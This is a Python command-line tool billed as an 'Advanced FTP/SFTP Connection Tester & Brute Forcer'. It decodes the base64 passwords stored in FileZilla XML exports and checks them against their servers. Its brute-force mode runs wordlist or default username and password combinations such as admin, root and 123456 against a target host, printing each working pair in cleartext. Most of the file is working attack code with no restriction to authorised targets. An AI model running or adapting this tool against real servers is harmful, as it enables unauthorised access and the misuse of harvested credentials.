import ftplib
import argparse
import xml.etree.ElementTree as ET
from xml.dom import minidom
from datetime import datetime
import base64
import os
import sys
import json
import csv
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import paramiko
import logging
from typing import List, Dict, Any, Optional
from colorama import init, Fore, Style

# Initialize colorama
init()

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Add ASCII art banner with colors
def print_banner():
    banner = f"""
{Fore.CYAN}
███████╗████████╗██████╗░  ███████╗░█████╗░███╗░░██╗
██╔════╝╚══██╔══╝██╔══██╗  ╚════██║██╔══██╗████╗░██║
█████╗░░░░░██║░░░██████╔╝  ░░███╔═╝███████║██╔██╗██║
██╔══╝░░░░░██║░░░██╔═══╝░  ██╔══╝░░██╔══██║██║╚████║
██║░░░░░░░░██║░░░██║░░░░░  ███████╗██║░░██║██║░╚███║
╚═╝░░░░░░░░╚═╝░░░╚═╝░░░░░  ╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝
{Style.RESET_ALL}
{Fore.YELLOW}Advanced FTP/SFTP Connection Tester & Brute Forcer{Style.RESET_ALL}
"""
    print(banner)

class FileZillaParser:
    @staticmethod
    def parse_filezilla_xml(xml_file: str) -> List[Dict[str, Any]]:
        """Parse FileZilla XML configuration file"""
        try:
            tree = ET.parse(xml_file)
            root = tree.getroot()
            
            servers = []
            
            # Find all Server elements
            for server_elem in root.findall('.//Server'):
                server = {}
                
                # Extract basic server info
                server['host'] = server_elem.find('Host').text if server_elem.find('Host') is not None else None
                server['port'] = int(server_elem.find('Port').text) if server_elem.find('Port') is not None else 21
                server['protocol'] = int(server_elem.find('Protocol').text) if server_elem.find('Protocol') is not None else 0
                server['username'] = server_elem.find('User').text if server_elem.find('User') is not None else None
                
                # Handle password decoding
                pass_elem = server_elem.find('Pass')
                if pass_elem is not None:
                    encoding = pass_elem.get('encoding', '')
                    password = pass_elem.text
                    
                    if encoding == 'base64' and password:
                        try:
                            server['password'] = base64.b64decode(password).decode('utf-8')
                        except:
                            server['password'] = password  # Fallback to raw text if decoding fails
                    else:
                        server['password'] = password
                else:
                    server['password'] = None
                
                # Get additional server details if available
                server['name'] = f"{server['username']}@{server['host']}:{server['port']}"
                server['type'] = "FTP" if server['protocol'] == 0 else "SFTP"
                server['logontype'] = server_elem.find('Logontype').text if server_elem.find('Logontype') is not None else "1"
                
                servers.append(server)
            
            return servers
        except Exception as e:
            logger.error(f"Error parsing FileZilla XML: {str(e)}")
            print(f"{Fore.RED}Error parsing FileZilla XML: {str(e)}{Style.RESET_ALL}")
            raise Exception(f"Error parsing FileZilla XML: {str(e)}")

class FTPChecker:
    def __init__(self, host: str, username: str, password: str, port: int = 21, 
                 timeout: int = 10, check_path: Optional[str] = None):
        self.host = host
        self.username = username
        self.password = password
        self.port = port
        self.timeout = timeout
        self.check_path = check_path
        self.results = {
            'host': host,
            'port': port,
            'username': username,
            'protocol': 'FTP',
            'timestamp': datetime.now().isoformat(),
            'connection': False,
            'connection_time': None,
            'authentication': False,
            'auth_time': None,
            'path_exists': None,
            'path_type': None,
            'path_check_time': None,
            'welcome_message': None,
            'features': [],
            'errors': []
        }

    def check(self) -> Dict[str, Any]:
        start_time = time.time()
        
        try:
            # Test connection
            with ftplib.FTP() as ftp:
                # Connection test
                connect_start = time.time()
                ftp.connect(self.host, self.port, self.timeout)
                self.results['connection_time'] = round((time.time() - connect_start) * 1000, 2)  # ms
                self.results['connection'] = True
                
                # Get welcome message
                try:
                    self.results['welcome_message'] = ftp.getwelcome()
                except:
                    pass
                
                # Authentication test
                auth_start = time.time()
                ftp.login(self.username, self.password)
                self.results['auth_time'] = round((time.time() - auth_start) * 1000, 2)  # ms
                self.results['authentication'] = True
                
                # Get FTP features if available
                try:
                    ftp.voidcmd("FEAT")
                    # If we get here, we can try to parse features
                    try:
                        ftp.sendcmd("FEAT")
                        # Parse features response
                        response = ftp.sendcmd("FEAT")
                        if response.startswith('211-'):
                            features = response.split('\n')[1:-1]  # Skip first and last lines
                            self.results['features'] = [f.strip() for f in features if f.strip()]
                    except:
                        pass
                except ftplib.error_perm:
                    # FEAT command not supported
                    pass
                
                # Path existence test if requested
                if self.check_path:
                    path_start = time.time()
                    try:
                        # Check if it's a directory
                        try:
                            ftp.cwd(self.check_path)
                            self.results['path_exists'] = True
                            self.results['path_type'] = 'directory'
                        except ftplib.error_perm:
                            # Check if it's a file
                            parent_dir = '/'.join(self.check_path.split('/')[:-1]) or '/'
                            filename = self.check_path.split('/')[-1]
                            try:
                                ftp.cwd(parent_dir)
                                files = []
                                ftp.retrlines('NLST', files.append)
                                if filename in files:
                                    self.results['path_exists'] = True
                                    self.results['path_type'] = 'file'
                                else:
                                    self.results['path_exists'] = False
                                    self.results['errors'].append(f"Path '{self.check_path}' not found")
                            except ftplib.error_perm as e:
                                self.results['path_exists'] = False
                                self.results['errors'].append(f"Error accessing parent directory: {str(e)}")
                    except Exception as e:
                        self.results['path_exists'] = False
                        self.results['errors'].append(f"Path check error: {str(e)}")
                    finally:
                        self.results['path_check_time'] = round((time.time() - path_start) * 1000, 2)  # ms
                    
        except ftplib.all_errors as e:
            self.results['errors'].append(f"FTP error: {str(e)}")
        except socket.timeout:
            self.results['errors'].append("Connection timed out")
        except socket.gaierror:
            self.results['errors'].append("Hostname resolution failed")
        except Exception as e:
            self.results['errors'].append(f"Unexpected error: {str(e)}")
        
        self.results['total_time'] = round((time.time() - start_time) * 1000, 2)  # ms
        
        return self.results

class SFTPChecker:
    def __init__(self, host: str, username: str, password: str, port: int = 22, 
                 timeout: int = 10, check_path: Optional[str] = None):
        self.host = host
        self.username = username
        self.password = password
        self.port = port
        self.timeout = timeout
        self.check_path = check_path
        self.results = {
            'host': host,
            'port': port,
            'username': username,
            'protocol': 'SFTP',
            'timestamp': datetime.now().isoformat(),
            'connection': False,
            'connection_time': None,
            'authentication': False,
            'auth_time': None,
            'path_exists': None,
            'path_type': None,
            'path_check_time': None,
            'welcome_message': None,
            'features': [],
            'errors': []
        }

    def check(self) -> Dict[str, Any]:
        start_time = time.time()
        ssh = None
        
        try:
            # Connection test
            connect_start = time.time()
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.host, self.port, self.username, self.password, timeout=self.timeout)
            self.results['connection_time'] = round((time.time() - connect_start) * 1000, 2)  # ms
            self.results['connection'] = True
            self.results['authentication'] = True
            
            # Path existence test if requested
            if self.check_path:
                path_start = time.time()
                try:
                    sftp = ssh.open_sftp()
                    try:
                        stat = sftp.stat(self.check_path)
                        self.results['path_exists'] = True
                        if stat.st_mode is not None:
                            self.results['path_type'] = 'directory' if stat.st_mode & 0o40000 else 'file'
                    except IOError:
                        self.results['path_exists'] = False
                        self.results['errors'].append(f"Path '{self.check_path}' not found")
                    finally:
                        sftp.close()
                except Exception as e:
                    self.results['path_exists'] = False
                    self.results['errors'].append(f"Path check error: {str(e)}")
                finally:
                    self.results['path_check_time'] = round((time.time() - path_start) * 1000, 2)  # ms
                    
        except paramiko.AuthenticationException:
            self.results['errors'].append("Authentication failed")
        except paramiko.SSHException as e:
            self.results['errors'].append(f"SSH error: {str(e)}")
        except socket.timeout:
            self.results['errors'].append("Connection timed out")
        except socket.gaierror:
            self.results['errors'].append("Hostname resolution failed")
        except Exception as e:
            self.results['errors'].append(f"Unexpected error: {str(e)}")
        finally:
            if ssh:
                ssh.close()
        
        self.results['total_time'] = round((time.time() - start_time) * 1000, 2)  # ms
        self.results['auth_time'] = self.results['connection_time']  # For SFTP, connection and auth happen together
        
        return self.results

class BruteForcer:
    def __init__(self, host: str, protocol: int = 0, timeout: int = 10, 
                 max_workers: int = 5, check_path: Optional[str] = None):
        self.host = host
        self.protocol = protocol
        self.timeout = timeout
        self.max_workers = max_workers
        self.check_path = check_path
        self.results = []
        
    def brute_force(self, username_list: List[str], password_list: List[str], 
                   port_list: List[int] = None) -> List[Dict[str, Any]]:
        """Brute force FTP/SFTP with username/password/port combinations"""
        if not port_list:
            port_list = [21] if self.protocol == 0 else [22]
        
        # Generate all combinations
        total_attempts = len(username_list) * len(password_list) * len(port_list)
        print(f"{Fore.YELLOW}Starting brute force with {total_attempts} combinations...{Style.RESET_ALL}")
        
        # Create all combinations
        combinations = []
        for port in port_list:
            for username in username_list:
                for password in password_list:
                    combinations.append({
                        'host': self.host,
                        'port': port,
                        'username': username,
                        'password': password,
                        'protocol': self.protocol
                    })
        
        # Test all combinations with thread pool
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_combo = {}
            
            for combo in combinations:
                if combo['protocol'] == 0:  # FTP
                    future = executor.submit(
                        FTPChecker(
                            combo['host'], 
                            combo['username'], 
                            combo['password'], 
                            combo['port'], 
                            self.timeout,
                            self.check_path
                        ).check
                    )
                else:  # SFTP
                    future = executor.submit(
                        SFTPChecker(
                            combo['host'], 
                            combo['username'], 
                            combo['password'], 
                            combo['port'], 
                            self.timeout,
                            self.check_path
                        ).check
                    )
                future_to_combo[future] = combo
            
            for i, future in enumerate(as_completed(future_to_combo)):
                combo = future_to_combo[future]
                try:
                    result = future.result()
                    self.results.append(result)
                    
                    # Show progress
                    progress = (i + 1) / total_attempts * 100
                    
                    if result['connection'] and result['authentication']:
                        print(Fore.GREEN + f"✓ FOUND: {combo['username']}:{combo['password']}@{combo['host']}:{combo['port']} "
                              f"({progress:.1f}% complete)" + Style.RESET_ALL)
                    else:
                        if (i + 1) % 10 == 0:  # Show progress every 10 attempts
                            print(Fore.YELLOW + f"Progress: {progress:.1f}% ({i+1}/{total_attempts})" + Style.RESET_ALL)
                            
                except Exception as e:
                    error_result = {
                        'host': combo['host'],
                        'port': combo['port'],
                        'username': combo['username'],
                        'protocol': 'FTP' if combo['protocol'] == 0 else 'SFTP',
                        'timestamp': datetime.now().isoformat(),
                        'connection': False,
                        'authentication': False,
                        'errors': [f"Check failed: {str(e)}"]
                    }
                    self.results.append(error_result)
        
        return self.results

class AdvancedFTPChecker:
    def __init__(self):
        self.results = []
        
    def check_servers(self, servers: List[Dict[str, Any]], max_workers: int = 5, 
                      check_path: Optional[str] = None, timeout: int = 10) -> List[Dict[str, Any]]:
        """Check multiple servers concurrently"""
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Start the load operations and mark each future with its server
            future_to_server = {}
            
            for server in servers:
                if server['protocol'] == 0:  # FTP
                    future = executor.submit(
                        FTPChecker(
                            server['host'], 
                            server['username'], 
                            server['password'], 
                            server['port'], 
                            timeout,
                            check_path
                        ).check
                    )
                    future_to_server[future] = server
                elif server['protocol'] == 1:  # SFTP
                    future = executor.submit(
                        SFTPChecker(
                            server['host'], 
                            server['username'], 
                            server['password'], 
                            server.get('port', 22),  # Default SFTP port
                            timeout,
                            check_path
                        ).check
                    )
                    future_to_server[future] = server
            
            for future in as_completed(future_to_server):
                server = future_to_server[future]
                try:
                    result = future.result()
                    self.results.append(result)
                    # Only show successful connections with color
                    if result['connection'] and result['authentication']:
                        print(Fore.GREEN + f"✓ SUCCESS: {server['username']}:{server['password']}@{server['host']}:{server['port']} ({server['type']}) - "
                              f"Connection: {result['connection_time']}ms, Auth: {result['auth_time']}ms" + Style.RESET_ALL)
                    else:
                        print(Fore.RED + f"✗ FAILED: {server['username']}@{server['host']}:{server['port']} ({server['type']})" + Style.RESET_ALL)
                        if result['errors']:
                            for error in result['errors']:
                                print(Fore.YELLOW + f"  Error: {error}" + Style.RESET_ALL)
                except Exception as e:
                    error_result = {
                        'host': server['host'],
                        'port': server['port'],
                        'username': server['username'],
                        'protocol': 'FTP' if server['protocol'] == 0 else 'SFTP',
                        'timestamp': datetime.now().isoformat(),
                        'connection': False,
                        'authentication': False,
                        'errors': [f"Check failed: {str(e)}"]
                    }
                    self.results.append(error_result)
                    print(Fore.RED + f"✗ ERROR: {server['username']}@{server['host']}:{server['port']} ({server['type']}) - {str(e)}" + Style.RESET_ALL)
        
        return self.results

    def save_results(self, format_type: str, filename: Optional[str] = None):
        """Save results in various formats"""
        if format_type == "txt" or not filename:
            self._save_txt(filename)
        
        if format_type == "xml":
            self._save_xml(filename)
            
        if format_type == "json":
            self._save_json(filename)
            
        if format_type == "csv":
            self._save_csv(filename)
            
    def _save_txt(self, filename: Optional[str] = None):
        content = f"Advanced FTP/SFTP Check Results\n"
        content += f"==============================\n"
        content += f"Generated: {datetime.now().isoformat()}\n"
        content += f"Total servers: {len(self.results)}\n\n"
        
        successful = sum(1 for r in self.results if r['connection'] and r['authentication'])
        content += f"Successful connections: {successful}\n"
        content += f"Failed connections: {len(self.results) - successful}\n\n"
        
        for i, result in enumerate(self.results, 1):
            content += f"Server {i}: {result['username']}@{result['host']}:{result['port']} ({result.get('protocol', 'Unknown')})\n"
            content += f"  Connection: {'Success' if result['connection'] else 'Failed'}"
            if result['connection_time']:
                content += f" ({result['connection_time']}ms)"
            content += "\n"
            
            content += f"  Authentication: {'Success' if result['authentication'] else 'Failed'}"
            if result['auth_time']:
                content += f" ({result['auth_time']}ms)"
            content += "\n"
            
            if result['path_exists'] is not None:
                content += f"  Path check: {'Exists' if result['path_exists'] else 'Missing'}"
                if result['path_check_time']:
                    content += f" ({result['path_check_time']}ms)"
                if result['path_type']:
                    content += f" [Type: {result['path_type']}]"
                content += "\n"
            
            if result['welcome_message']:
                content += f"  Welcome: {result['welcome_message'][:100]}"
                if len(result['welcome_message']) > 100:
                    content += "..."
                content += "\n"
            
            if result['features']:
                content += f"  Features: {len(result['features'])} supported\n"
            
            content += f"  Total time: {result.get('total_time', 'N/A')}ms\n"
            
            if result['errors']:
                content += f"  Errors:\n"
                for error in result['errors']:
                    content += f"    - {error}\n"
            
            content += "\n"
        
        if filename:
            with open(filename, 'w') as f:
                f.write(content)
            print(Fore.CYAN + f"TXT report saved to {filename}" + Style.RESET_ALL)
        else:
            print(content)
    
    def _save_xml(self, filename: str):
        root = ET.Element("ftp_check_results")
        ET.SubElement(root, "timestamp").text = datetime.now().isoformat()
        ET.SubElement(root, "total_servers").text = str(len(self.results))
        
        successful = sum(1 for r in self.results if r['connection'] and r['authentication'])
        ET.SubElement(root, "successful_connections").text = str(successful)
        ET.SubElement(root, "failed_connections").text = str(len(self.results) - successful)
        
        servers_elem = ET.SubElement(root, "servers")
        for result in self.results:
            server_elem = ET.SubElement(servers_elem, "server")
            ET.SubElement(server_elem, "host").text = result['host']
            ET.SubElement(server_elem, "port").text = str(result['port'])
            ET.SubElement(server_elem, "username").text = result['username']
            ET.SubElement(server_elem, "protocol").text = result.get('protocol', 'Unknown')
            ET.SubElement(server_elem, "timestamp").text = result['timestamp']
            
            status_elem = ET.SubElement(server_elem, "status")
            ET.SubElement(status_elem, "connection").text = str(result['connection'])
            if result['connection_time']:
                ET.SubElement(status_elem, "connection_time_ms").text = str(result['connection_time'])
            ET.SubElement(status_elem, "authentication").text = str(result['authentication'])
            if result['auth_time']:
                ET.SubElement(status_elem, "authentication_time_ms").text = str(result['auth_time'])
            
            if result['path_exists'] is not None:
                path_elem = ET.SubElement(server_elem, "path_check")
                ET.SubElement(path_elem, "exists").text = str(result['path_exists'])
                if result['path_type']:
                    ET.SubElement(path_elem, "type").text = result['path_type']
                if result['path_check_time']:
                    ET.SubElement(path_elem, "check_time_ms").text = str(result['path_check_time'])
            
            if result['welcome_message']:
                ET.SubElement(server_elem, "welcome_message").text = result['welcome_message']
            
            if result['features']:
                features_elem = ET.SubElement(server_elem, "features")
                for feature in result['features']:
                    ET.SubElement(features_elem, "feature").text = feature
            
            ET.SubElement(server_elem, "total_time_ms").text = str(result.get('total_time', 'N/A'))
            
            if result['errors']:
                errors_elem = ET.SubElement(server_elem, "errors")
                for error in result['errors']:
                    ET.SubElement(errors_elem, "error").text = error
        
        # Pretty print XML
        xml_str = minidom.parseString(ET.tostring(root)).toprettyxml(indent="  ")
        with open(filename, 'w') as f:
            f.write(xml_str)
        print(Fore.CYAN + f"XML report saved to {filename}" + Style.RESET_ALL)
    
    def _save_json(self, filename: str):
        data = {
            "timestamp": datetime.now().isoformat(),
            "total_servers": len(self.results),
            "successful_connections": sum(1 for r in self.results if r['connection'] and r['authentication']),
            "failed_connections": len(self.results) - sum(1 for r in self.results if r['connection'] and r['authentication']),
            "servers": self.results
        }
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        print(Fore.CYAN + f"JSON report saved to {filename}" + Style.RESET_ALL)
    
    def _save_csv(self, filename: str):
        with open(filename, 'w', newline='') as f:
            writer = csv.writer(f)
            # Write header
            writer.writerow([
                'Host', 'Port', 'Username', 'Protocol', 'Connection', 'Connection Time (ms)',
                'Authentication', 'Auth Time (ms)', 'Path Exists', 'Path Type',
                'Path Check Time (ms)', 'Total Time (ms)', 'Errors'
            ])
            
            # Write data
            for result in self.results:
                writer.writerow([
                    result['host'],
                    result['port'],
                    result['username'],
                    result.get('protocol', 'Unknown'),
                    'Success' if result['connection'] else 'Failed',
                    result.get('connection_time', ''),
                    'Success' if result['authentication'] else 'Failed',
                    result.get('auth_time', ''),
                    'Yes' if result.get('path_exists') else 'No' if result.get('path_exists') is not None else 'N/A',
                    result.get('path_type', ''),
                    result.get('path_check_time', ''),
                    result.get('total_time', ''),
                    '; '.join(result['errors']) if result['errors'] else ''
                ])
        print(Fore.CYAN + f"CSV report saved to {filename}" + Style.RESET_ALL)

def read_wordlist(file_path: str) -> List[str]:
    """Read a wordlist file and return lines as list"""
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except Exception as e:
        print(f"{Fore.RED}Error reading wordlist {file_path}: {str(e)}{Style.RESET_ALL}")
        return []

def main():
    print_banner()  # Show banner

    parser = argparse.ArgumentParser(description="Advanced FTP/SFTP Connection Tester & Brute Forcer")

    # Input selection (no longer mutually exclusive, so we can use --host with --brute-force)
    parser.add_argument("--filezilla-xml", help="Path to FileZilla XML export")
    parser.add_argument("--host", help="Target host (IP or domain)")
    parser.add_argument("--brute-force", action="store_true", help="Enable brute-force mode")

    # Credentials
    parser.add_argument("--port", type=int, help="Target port (default 21 FTP / 22 SFTP)")
    parser.add_argument("--username", help="Username for authentication")
    parser.add_argument("--password", help="Password for authentication")
    parser.add_argument("--protocol", type=int, choices=[0, 1], default=0,
                        help="0 = FTP (default), 1 = SFTP")

    # Brute force wordlists
    parser.add_argument("--user-list", help="File containing usernames")
    parser.add_argument("--pass-list", help="File containing passwords")
    parser.add_argument("--combo-list", help="File containing username:password combos")
    parser.add_argument("--port-list", help="File or comma-separated list of ports")

    # General options
    parser.add_argument("--timeout", type=int, default=10, help="Connection timeout (sec)")
    parser.add_argument("--max-workers", type=int, default=5, help="Concurrent connections")
    parser.add_argument("--check-path", help="Path to check on server")
    parser.add_argument("--txt", help="Save results to TXT")
    parser.add_argument("--xml", help="Save results to XML")
    parser.add_argument("--json", help="Save results to JSON")
    parser.add_argument("--csv", help="Save results to CSV")
    parser.add_argument("--quiet", action="store_true", help="Suppress console output")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")

    args = parser.parse_args()

    # Logging setup
    if args.debug:
        logger.setLevel(logging.DEBUG)
    elif args.quiet:
        logger.setLevel(logging.ERROR)

    results = []

    # --- Brute force mode ---
    if args.brute_force:
        if not args.host:
            print(Fore.RED + "Error: --host is required in brute-force mode" + Style.RESET_ALL)
            sys.exit(1)

        usernames, passwords = [], []

        # Load usernames
        if args.user_list:
            usernames = read_wordlist(args.user_list)
        elif args.username:
            usernames = [args.username]
        else:
            usernames = ["anonymous", "ftp", "admin", "root", "guest"]

        # Load passwords
        if args.pass_list:
            passwords = read_wordlist(args.pass_list)
        elif args.password:
            passwords = [args.password]
        else:
            passwords = ["anonymous", "ftp", "admin", "root", "guest", "123456", "password", ""]

        # Combo list overrides both
        if args.combo_list:
            combos = read_wordlist(args.combo_list)
            usernames, passwords = [], []
            for combo in combos:
                if ":" in combo:
                    u, p = combo.split(":", 1)
                    usernames.append(u.strip())
                    passwords.append(p.strip())

        # Ports
        if args.port_list:
            if os.path.isfile(args.port_list):
                ports = [int(p) for p in read_wordlist(args.port_list)]
            else:
                ports = [int(p) for p in args.port_list.split(",") if p.strip().isdigit()]
        else:
            ports = [args.port if args.port else (21 if args.protocol == 0 else 22)]

        # Run brute forcer
        brute = BruteForcer(args.host, args.protocol, args.timeout, args.max_workers, args.check_path)
        results = brute.brute_force(usernames, passwords, ports)

    # --- FileZilla XML mode ---
    elif args.filezilla_xml:
        try:
            servers = FileZillaParser.parse_filezilla_xml(args.filezilla_xml)
        except Exception as e:
            print(Fore.RED + f"Error parsing FileZilla XML: {e}" + Style.RESET_ALL)
            sys.exit(1)

        checker = AdvancedFTPChecker()
        results = checker.check_servers(servers, args.max_workers, args.check_path, args.timeout)

    # --- Single host mode ---
    elif args.host:
        if not args.username or not args.password:
            print(Fore.RED + "Error: --username and --password are required with --host (non-brute mode)" + Style.RESET_ALL)
            sys.exit(1)

        servers = [{
            "host": args.host,
            "port": args.port if args.port else (21 if args.protocol == 0 else 22),
            "protocol": args.protocol,
            "username": args.username,
            "password": args.password
        }]

        checker = AdvancedFTPChecker()
        results = checker.check_servers(servers, args.max_workers, args.check_path, args.timeout)

    else:
        print(Fore.RED + "Error: No mode selected" + Style.RESET_ALL)
        sys.exit(1)

    # --- Save results ---
    adv_checker = AdvancedFTPChecker()
    adv_checker.results = results
    if args.txt:
        adv_checker.save_results("txt", args.txt)
    if args.xml:
        adv_checker.save_results("xml", args.xml)
    if args.json:
        adv_checker.save_results("json", args.json)
    if args.csv:
        adv_checker.save_results("csv", args.csv)

if __name__ == "__main__":
    main()